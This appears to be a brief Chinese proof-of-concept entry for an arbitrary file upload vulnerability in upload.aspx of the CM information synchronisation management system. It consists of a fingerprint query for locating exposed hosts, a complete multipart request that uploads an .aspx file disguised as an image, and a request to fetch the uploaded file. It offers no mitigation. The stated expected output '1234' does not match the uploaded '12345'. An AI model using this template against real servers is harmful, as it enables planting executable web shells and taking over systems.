# CM信息同步管理系统upload.aspx存在任意文件上传漏洞

- **系统**：CM信息同步管理系统　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`web.body="icon pwd"`
- **请求**：`POST /upload.aspx HTTP/1.1`
- **关键头**：`Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryFfJZ4PlA…`

**请求体 / payload**
```
------WebKitFormBoundaryFfJZ4PlAZBixjELj
Content-Disposition: form-data; name="file"; filename="test.aspx"
Content-Type: image/png
12345
------WebKitFormBoundaryFfJZ4PlAZBixjELj--
文件定位：
GET /up/611d3aa6339e484b876b85616de42bd8.aspx HTTP/1.1
Host:
```
- **预期**：200　|　1234